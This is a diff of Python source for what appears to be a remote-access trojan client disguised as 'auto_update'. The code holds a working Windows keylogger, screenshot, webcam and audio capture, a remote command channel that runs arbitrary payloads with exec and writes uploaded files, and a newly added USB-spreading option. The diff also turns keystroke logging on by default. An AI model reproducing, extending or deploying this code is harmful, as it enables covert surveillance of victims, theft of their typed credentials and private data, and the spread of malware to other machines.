@@ -1,16 +1,38 @@
-Source = r"""
-# TODO: SOURCE START
+Source = r'''
+# coding=utf-8
 ID = ''
 COMMANDS = {}
 DOWNLOADS = {}
 QUERY = []
+FILE_HANDLER = {}
 
 destination_directory = 'iDocuments'
 client_name = 'auto_update'
 client_version = '1.0'
 os_type = str(sys.platform)
 os_name = str(platform.platform())
-os_user = os.path.expanduser('~').split('\\')[-1]
+
+advapi32 = ctypes.windll.advapi32
+
+def GetUserName():
+    GetUserNameW = advapi32.GetUserNameW
+    GetUserNameW.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_uint)]
+    GetUserNameW.restype = ctypes.c_uint
+
+    def GetUserName():
+        buffer = ctypes.create_unicode_buffer(2)
+        size = ctypes.c_uint(len(buffer))
+        while not GetUserNameW(buffer, ctypes.byref(size)):
+            buffer = ctypes.create_unicode_buffer(len(buffer) * 2)
+            size.value = len(buffer)
+        return buffer.value
+
+    return GetUserName
+
+
+GetUserName = GetUserName()
+#os_user = os.path.expanduser('~').split('\\')[-1]
+os_user = GetUserName()
 
 KEY_LOGS = {}
 SCREENSHOT_LOGS = {}
@@ -18,24 +40,22 @@ AUDIO_LOGS = {}
 
 CURRENT_WINDOW_TITLE = None
 
-uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-
 try:
     import vidcap
     cam = vidcap.new_Dev(0, 0)
-    web_camera_input = str(cam.getdisplayname())
-    del cam
+    web_camera_input = True
 except:
-    web_camera_input = 'NoDevice'
+    cam = None
+    web_camera_input = False
 
 try:
     import pyaudio
     p = pyaudio.PyAudio()
     device_name = p.get_default_input_device_info()
     del p
-    audio_input = device_name['name']
+    audio_input = True
 except:
-    audio_input = 'NoDevice'
+    audio_input = False
 
 # Init Winapi
 Kernel32 = ctypes.windll.kernel32
@@ -53,13 +73,14 @@ bottom = User32.GetSystemMetrics(79)
 width = right - left
 height = bottom - top
 
-
 class REACTOR(threading.Thread):
 
     def __init__(self, data):
         super(REACTOR, self).__init__()
         global COMMANDS
         global DOWNLOADS
+        global FILE_HANDLER
+        global USBSPREADING
 
         self.data = data
         self.active_thread = True
@@ -72,6 +93,10 @@ class REACTOR(threading.Thread):
         # Terminate Client
         if self.data['mode'] == 'terminateClient':
             os._exit(1)
+
+        elif self.data['mode'] == 'usbSpreading':
+            check_usb_spreading()
+            return
 
         elif self.data['mode'] == 'updateSource':
             raise ValueError('Manually Generated Exception')
@@ -92,13 +117,14 @@ class REACTOR(threading.Thread):
         # Execute Script
         elif self.data['mode'] == 'scriptingMode':
             mprint = ''
+            mdump = ''
             try:
                 exec self.data['payload']
-                if mprint == '':
+                if mprint == '' and mdump == '':
                     return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
-                output = str(mprint)
+                output = str({'mprint': mprint, 'mdump': mdump})
             except Exception as e:
-                output = str(e)
+                output = str({'mprint': str(e), 'mdump': mdump})
 
         # Get Desktop Preview
         elif self.data['mode'] == 'getScreen':
@@ -107,6 +133,10 @@ class REACTOR(threading.Thread):
         # Get Webcam Preview
         elif self.data['mode'] == 'getWebcam':
             output = webcam_shot()
+
+        # InfoChecker
+        elif self.data['mode'] == 'infoChecker':
+            data_send(check_info(), 'infoChecker')
 
         # Set Log Settings
         elif self.data['mode'] == 'setLogSettings':
@@ -142,8 +172,6 @@ class REACTOR(threading.Thread):
             filename = self.data['payload']['file_name']
             raw_data = base64.b64decode(self.data['payload']['raw_data'])
             open(filename, 'wb').write(raw_data)
-        elif self.data['mode'] == 'uploadMode':
-            pass
         else:
             return
 
@@ -213,26 +241,46 @@ PROCESS_QUERY_INFORMATION = 0x0400
 def init():
     variables = {
             'i': '',
-            'kts': False,
-            'kt': 30,
+            'kts': True,
+            'kt': 300,
             'ats': False,
             'at': 30,
             'atr': 1500,
             'sts': False,
             'std': 20,
             'st': 30,
+            'usp': True,
         }
     if os.path.exists(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo')):
         variables = open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'r').read()
         try:
-            return ast.literal_eval(variables)
+            variables = ast.literal_eval(variables)
+            if not variables.has_key('usp'):
+                variables['usp'] = True
+            return variables
         except:
+            if not variables.has_key('usp'):
+                variables['usp'] = True
             return variables
     else:
         open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w').write(str(variables))
         os.popen('attrib -h -r -s /s /d %s' % os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'))
         return variables
 
+config = init()
+USBSPREADING = config['usp']
+
+def check_usb_spreading():
+    global USBSPREADING
+    config = init()
+    if config.has_key('usp'):
+        if config['usp'] == True:
+            config['usp'] = False
+            USBSPREADING = False
+        else:
+            config['usp'] = True
+            USBSPREADING = True
+        set_info(config)
 
 def get_content():
     string = {
@@ -244,9 +292,13 @@ def get_content():
     for letter in uppercase:
         drive = u'{}:\\'.format(letter)
         if bitmask & 1:
-            try:
+            mounted_letters = subprocess.Popen('wmic logicaldisk where deviceid="%s:" get Size' % letter,
+                                                           startupinfo=startupinfo, stdout=subprocess.PIPE,
+                                                           stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+            length = mounted_letters.stdout.readlines()[1].strip()
+            if length.isdigit():
                 os.chdir(drive)
-            except:
+            else:
                 continue
             volume_name_buffer = ctypes.create_unicode_buffer(1024)
             Kernel32.GetVolumeInformationW(drive, volume_name_buffer,
@@ -288,6 +340,8 @@ def set_info(values):
         config['std'] = values['std']
     if values.has_key('st'):
         config['st'] = values['st']
+    if values.has_key('usp'):
+        config['usp'] = values['usp']
     open(os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo'), 'w').write(str(config))
 
 
@@ -333,7 +387,10 @@ def send_keylog():
         CURRENT_WINDOW_TITLE = ''
         keys_for_send = str(KEY_LOGS)
         KEY_LOGS = {}
-        data_send(keys_for_send, 'keyloggerLogs')
+        try:
+            data_send(keys_for_send, 'keyloggerLogs')
+        except KeyError:
+            pass
     key_scheduler = sched.scheduler(time.time, time.sleep)
     key_scheduler.enter(config['kt'], 1, send_keylog, ())
     key_scheduler.run()
@@ -361,7 +418,10 @@ def send_audio():
     config = init()
     if config['ats'] and len(AUDIO_LOGS) > 0:
         for i in AUDIO_LOGS.keys():
-            data_send(str(AUDIO_LOGS[i]), 'audioLogs')
+            try:
+                data_send(str(AUDIO_LOGS[i]), 'audioLogs')
+            except KeyError:
+                pass
         AUDIO_LOGS = {}
     audio_scheduler = sched.scheduler(time.time, time.sleep)
     audio_scheduler.enter(config['at'], 1, send_audio, ())
@@ -383,8 +443,9 @@ def get_fptr(fn):
 
 
 class KeyLogger:
-    def __init__(self):
+    def __init__(self, write_key):
         self.hooked = None
+        self.write_key = write_key
 
     def install_hook_proc(self, pointer):
         self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
@@ -398,13 +459,6 @@ class KeyLogger:
         ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
 
-
-class Key(threading.Thread):
-    def __init__(self):
-        super(Key, self).__init__()
-
-        global KEY_LOGS
-
     @staticmethod
     def update_key(k):
         if updatecode.has_key(k):
@@ -414,6 +468,37 @@ class Key(threading.Thread):
                 return str(chr(k))
             except:
                 return '{UnknownKeyCode: %s}' % k
+
+    def hook_proc(self, n_code, w_param, l_param):
+        global ACTIVE
+        if not ACTIVE:
+            self.uninstall_hook_proc()
+        if w_param is not 0x0100:
+            return User32.CallNextHookEx(self.hooked, n_code, w_param, l_param)
+
+        if keycodes.has_key(l_param[0]):
+            key = keycodes[l_param[0]]
+        else:
+            if User32.GetKeyState(0x14) & 1:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).lower()
+                else:
+                    key = self.update_key(l_param[0]).upper()
+            else:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).upper()
+                else:
+                    key = self.update_key(l_param[0]).lower()
+
+        self.write_key(key)
+        return User32.CallNextHookEx(self.hooked, n_code, w_param, l_param)
+
+
+class Key(threading.Thread):
+    def __init__(self):
+        super(Key, self).__init__()
+
+        global KEY_LOGS
 
     @staticmethod
     def write_key(log):
@@ -433,35 +518,25 @@ class Key(threading.Thread):
                 KEY_LOGS['logs'] = '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
             CURRENT_WINDOW_TITLE = new_window_title
 
-    def hook_proc(self, n_code, w_param, l_param):
-        if w_param is not 0x0100:
-            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
-
-        if keycodes.has_key(l_param[0]):
-            key = keycodes[l_param[0]]
-        else:
-            if User32.GetKeyState(0x14) & 1:
-                if User32.GetKeyState(0x10) & 0x8000:
-                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).lower()
-                else:
-                    key = self.update_key(l_param[0]).upper()
-            else:
-                if User32.GetKeyState(0x10) & 0x8000:
-                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).upper()
-                else:
-                    key = self.update_key(l_param[0]).lower()
-
-        self.write_key(key)
-        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
-
     @staticmethod
     def start_keylogger():
         msg = MSG()
         User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)
 
+    def catch(self):
+        global ACTIVE
+        while 1:
+            if not ACTIVE:
+                self.keyLogger.uninstall_hook_proc()
+                break
+            time.sleep(1)
+        return
+
     def run(self):
-        self.keyLogger = KeyLogger()
-        self.pointer = get_fptr(self.hook_proc)
+        self.keyLogger = KeyLogger(self.write_key)
+        self.pointer = get_fptr(self.keyLogger.hook_proc)
+        self.stop_logging = threading.Thread(target=self.catch)
+        self.stop_logging.start()
         if self.keyLogger.install_hook_proc(self.pointer):
             pass
         self.start_keylogger()
@@ -485,10 +560,11 @@ class AudioStreaming(threading.Thread):
 
     def run(self):
         global AUDIO_LOGS
+        global ACTIVE
 
         config = init()
 
-        while 1:
+        while ACTIVE:
             if len(self.frames) > config['at']*4.6:
                 AUDIO_LOGS[get_date_time()] = {
                     'raw': zlib.compress(b''.join(self.frames)),
@@ -501,14 +577,15 @@ class AudioStreaming(threading.Thread):
 
         self.stream.close()
         self.p.terminate()
+        return
 
 
 # Screen Shots
 class Screenshoter(threading.Thread):
 
     def run(self):
-
-        while 1:
+        global ACTIVE
+        while ACTIVE:
             config = init()
             if config['sts']:
                 delay = config['std']
@@ -540,6 +617,7 @@ def check_info():
         'sts':              config['sts'],
         'std':              config['std'],
         'st':               config['st'],
+        'usp':              config['usp'],
     }
 
 
@@ -675,17 +753,6 @@ def get_processes_list():
             CloseHandle(hProcess)
     return str(PROCESSES)
 
-def send_info():
-    global ACTIVE
-    while ACTIVE:
-        try:
-            info_data = check_info()
-            data_send(info_data, 'infoChecker')
-            time.sleep(5)
-        except socket.error:
-            ACTIVE = False
-
-
 def reactor():
     global ACTIVE
     global ID
@@ -696,16 +763,13 @@ def reactor():
         key = get_key()
         if len(key) != 0:
             ID = key
-            data_send(key, 'clientInitializing')
+            data_send(key, 'clientInitializing', MODERATOR)
         else:
-            data_send('noKey', 'clientInitializing')
+            data_send('noKey', 'clientInitializing', MODERATOR)
             data_receive()
             new_key = QUERY.pop(0)
             set_key(new_key['payload'])
             ID = new_key['payload']
-
-        info_sernder_thread = threading.Thread(target=send_info)
-        info_sernder_thread.start()
 
         # After Initialized
         while ACTIVE:
@@ -725,14 +789,18 @@ os.chdir(os.path.dirname(sys.argv[0]))
 # Run Loggers
 run_scheduler()
 keylogger = Key()
+keylogger.setDaemon(True)
 keylogger.start()
 screenshoter = Screenshoter()
+screenshoter.setDaemon(True)
 screenshoter.start()
-if not audio_input == 'NoDevice':
+if audio_input:
     audioLogger = AudioStreaming(5120)
+    audioLogger.setDaemon(True)
     audioLogger.start()
 # Main Reactor
 reactor()
 
 # TODO: SOURCE END
-"""
+
+'''
